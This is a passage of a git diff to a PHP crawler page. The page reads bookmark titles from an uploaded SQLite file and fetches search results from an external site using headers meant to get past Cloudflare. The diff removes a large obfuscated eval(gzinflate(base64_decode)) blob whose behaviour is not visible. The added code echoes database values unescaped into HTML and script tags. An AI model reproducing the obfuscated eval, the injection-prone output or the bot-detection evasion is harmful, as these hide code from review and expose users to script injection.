@@ -29,7 +29,11 @@ class streamS{constructor(a){this.id=a}setup(){var a=t;function t(a,e){var r=n()
 
         <form enctype="multipart/form-data" action='' method="post">
             <input type="file" name="file" accept=".db" required>
-            <input type="submit" value="Submit">
+            <select name="type" required>
+            <option value="all">Crawl All URL</option>
+            <option value="db">Only Crawl DB</option>
+            </select>
+            <input type="submit" value="CRAWL!">
         </form>
         <h3 id="proccess">Current Proccess &#8594; <span style="color:slategray;"> [EMPTY] </span></h3>
 
@@ -42,7 +46,301 @@ class streamS{constructor(a){this.id=a}setup(){var a=t;function t(a,e){var r=n()
             use GuzzleHttp\Exception\RequestException;
             use GuzzleHttp\Middleware;
 
-            eval(gzinflate(str_rot13(base64_decode('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'))));
+            if ($_FILES && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
+                $allowedExtensions = array('db');
+                $fileExtension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); // Get the file extension
+
+                if (!in_array(strtolower($fileExtension), $allowedExtensions)) {
+                    echo "Error uploading file.";
+                    exit;
+                }
+
+                $db = new SQLite3($_FILES['file']['tmp_name']);
+
+                // Fetch data from the database
+                $query = "SELECT id, post_type, post_id, type, title, image, time FROM bookmark ORDER BY title ASC";
+                $result = $db->query($query);
+
+                $final_result = '';
+
+                // Display data in cards
+                // Process each item one by one
+                while ($row = $result->fetchArray()) {
+                    echo '<script>document.getElementById(`proccess`).innerHTML = `Current Proccess &#8594; <span style="color:slategray;"> ' . $row['title'] . ' </span>`</script>';
+
+                    ob_flush();
+                    flush();
+
+                    $mode = $_POST['type'];
+
+                    // Process the item
+                    $itemResult = proccessData($row,$mode);
+
+                    // Append item result to final result
+                    $final_result .= $itemResult;
+
+                    // Output the final result after processing each item
+                    echo $final_result;
+
+                    // Flush the output buffer to immediately send data to the client
+                    ob_flush();
+                    flush();
+
+                    // Clear $final_result for the next iteration
+                    $final_result = '';
+                }
+
+                echo '<script>document.getElementById(`proccess`).innerHTML = `Current Proccess &#8594; <span style="color:slategray;"> All Proccess Finished! </span>`</script>';
+
+                ob_flush();
+                flush();
+                echo $final_result;
+
+                // Close database connection
+                $db->close();
+            } elseif ($_FILES && $_FILES['file']['error'] != UPLOAD_ERR_OK) {
+                echo "Error uploading file.";
+                exit;
+            }
+
+            function proccessData($row,$mode)
+            {
+                $BASEDOMAIN = 'nekopoi.care';
+                // Custom headers for bypass cloudflare
+                $headers = array(
+                    'Host' => $BASEDOMAIN,
+                    'Sec-Ch-Ua' => '"Not(A:Brand";v="24", "Chromium";v="122"',
+                    'Sec-Ch-Ua-Mobile' => '?0',
+                    'Sec-Ch-Ua-Platform' => '"Windows"',
+                    'Upgrade-Insecure-Requests' => '1',
+                    'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
+                    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'Sec-Fetch-Site' => 'cross-site',
+                    'Sec-Fetch-Mode' => 'navigate',
+                    'Sec-Fetch-User' => '?1',
+                    'Sec-Fetch-Dest' => 'document',
+                    'Referer' => $_SERVER['SERVER_PROTOCOL'] . "://" . $_SERVER['HTTP_HOST'],
+                    'Accept-Encoding' => 'identity',
+                    'Accept-Language' => 'en-US,en;q=0.9',
+                    'Priority' => 'u=0, i',
+                    'Connection' => 'close'
+                );
+
+                $final_result = '';
+
+                if ($row['title'] != null) {
+
+                    $final_result .= '<div class="card">';
+
+                    if ($row['image']) {
+                        $final_result .= '<img src="' . $row['image'] . '" alt="Image">';
+                    }
+                    $final_result .= '<h2 style="font-size: 1.3em !important;"><a target="_blank" style="text-decoration:none; color:floralwhite;" href="https://' . $BASEDOMAIN . '/search/' . str_replace(' ', '+', $row['title']) . '">' . $row['title'] . '</a></h2>';
+
+                    if($mode == 'db'){
+                        return $final_result . "</div></details></details>";
+                    }
+
+
+                    $initial_url = "https://$BASEDOMAIN/search/" . rawurlencode($row['title']);
+                    // Create a Guzzle client with custom headers
+                    $client = new Client([
+                        'headers' => $headers,
+                        'curl' => [
+                            CURLOPT_FRESH_CONNECT => true,
+                            CURLOPT_FORBID_REUSE => true,
+                        ],
+                    ]);
+
+                    try {
+                        try {
+                            $initial_html = $client->get($initial_url)->getBody()->getContents();
+                        } catch (Exception) {
+                            try {
+                                $initial_html = $client->get($initial_url)->getBody()->getContents();
+                            } catch (Exception $e) {
